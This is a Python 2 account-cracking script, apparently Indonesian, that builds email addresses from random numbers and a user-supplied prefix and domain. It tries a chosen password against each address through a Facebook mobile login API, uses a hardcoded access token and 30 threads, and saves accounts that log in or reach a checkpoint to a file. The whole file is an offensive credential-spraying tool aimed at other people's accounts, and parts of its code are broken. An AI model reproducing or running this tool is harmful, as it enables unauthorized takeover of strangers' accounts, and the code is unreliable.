#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(5000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('No Module Named Requests! type:pip2 install requests')
    
try:
    import mechanize
except ImportError:
    os.system('No Module Named Mechanize! type:pip2 install mechanize')
    time.sleep(1)
    os.system('Then type: python2 crack.py')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
		
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mPlease Wait \x1b[1;93m"+o),;sys.stdout.flush();time.sleep(1)

def psb(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.05)
		
hijau = '\x1b[32m'
cyan = '\x1b[36m'
kuning = '\x1b[33;1m'
ungu = '\x1b[35m'
putih = '\x1b[37m'
merah = '\x1b[31m'
biru = '\x1b[34m'

back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
logo='''
  \033[1;91m     _                           __  ______  
  \033[1;92m    / \   _ __   __ _  __ _  __ _\ \/ /  _ \ 
  \033[1;93m   / _ \ | '_ \ / _` |/ _` |/ _` |\  /| | | |
  \033[1;95m  / ___ \| | | | (_| | (_| | (_| |/  \| |_| |
  \033[1;96m /_/   \_\_| |_|\__, |\__, |\__,_/_/\_\____/ 
  \033[1;91m                |___/ |___/                        
\033[1;97m--------------------------------------------------
\033[1;97m  [\033[1;93m*\033[1;97m] Author  : Angga Kurniawan
\033[1;97m  [\033[1;93m*\033[1;97m] Version : 2.9
\033[1;97m  [\033[1;93m*\033[1;97m] GitHub  : https://github.com/anggaxd
\033[1;97m  [\033[1;93m*\033[1;97m] YouTube : ANGGA KURNIAWAN
\033[1;97m--------------------------------------------------
                                '''       
def tik():
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '\r\x1b[1;93mPlease Wait \x1b[1;93m' + o,
        sys.stdout.flush()
        time.sleep(1)
  
back = 0
berhasil = []
cekpoint = []
oks = []
id = []
cpb = []
  
def mail():
    os.system('clear')
    print logo
    print '\033[1;97m[\033[1;92m01\033[1;97m]    Crack Email Random'
	print '\033[1;97m[\033[1;92m00\033[1;97m]    Exit            '
    print 45 * '-'
    action()

def action():
    global cpb
    global oks
    anggaxd = raw_input('\n\x1b[1;97mPilih \x1b[1;95m')
    if anggaxd == '':
        print '[!] Fill in correctly'
        action()
    elif anggaxd == '1':
    	os.system('clear') 
        print logo
        print ('[\033[1;93m•\033[1;97m] Nama  : Angga') 
        print ('[\033[1;92m+\033[1;97m] Domain : @gmail.com @yahoo.com @hotmail.com') 
        try:
            k = raw_input('[\033[1;92m+\033[1;97m] Nama  : ')
            c = raw_input('[\033[1;93m?\033[1;97m] Domain : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            mail()

    elif anggaxd == '0':
        keluar()
    else:
        print '[!] Fill in correctly'
        action()  
    junee = raw_input('[\033[1;93m+\033[1;97m] Password 1 : ')
    junee = raw_input('[\033[1;93m+\033[1;97m] Password 2 : ')
    junee = raw_input('[\033[1;93m+\033[1;97m] Password 3 : ')
    print "\033[1;97m--------------------------------------------------"
    xxx = str(len(id))
    psb ('[\033[1;93m+\033[1;97m] Total Numbers: '+xxx)
    time.sleep(0.5)
    psb ('[\033[1;92m✓\033[1;97m] Cracking Process Has Been Started ...') 
    time.sleep(0.5)
    psb ('[\033[1;91m!\033[1;97m] To Stop Process Press CTRL Then Press z')
    time.sleep(0.5)
    print "\033[1;97m--------------------------------------------------"
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('junee')
        except OSError:
            pass
        try:
			pass1 = junee
			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
			q = json.load(data)
			if 'access_token' in q:
				print '\x1b[1;97m[\033[1;92mSuccessful\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
				okb = open('junee/crack.txt', 'a')
				okb.write(k+c+user+pass1+'\n')
				okb.close()
				oks.append(c+user+pass1)
			else:
				if 'www.facebook.com' in q['error_msg']:
					print '\033[1;97m[\033[1;93mCheckpoint\033[1;97m] ' + k + c + user + ' ◐ ' + pass1
					cps = open('junee/crack.txt', 'a')
					cps.write(k+c+user+pass1+'\n')
					cps.close()
					cpb.append(c+user+pass1)
		
        except:
            pass
            
    p = ThreadPool(30)
    p.map(main, id)
    print "\033[1;97m--------------------------------------------------"
    print '\033[1;97m[\033[1;92m✓\033[1;97m] Process Has Been Completed ...'
    print '[\033[1;92m✓\033[1;97m] Total \033[1;92mSuccessfully\033[1;97m/\033[1;93mCheckpoint\033[1;97m : '+str(len(oks))+'/'+str(len(cpb))
    print('[\033[1;92m✓\033[1;97m] Cracking Accounts Has Been Saved : junee/crack.txt')
    
    raw_input("\n\033[1;97m[\033[1;97mPress Enter Go Back\033[1;97m]")
    mail() 
          
if __name__ == '__main__':
    mail()
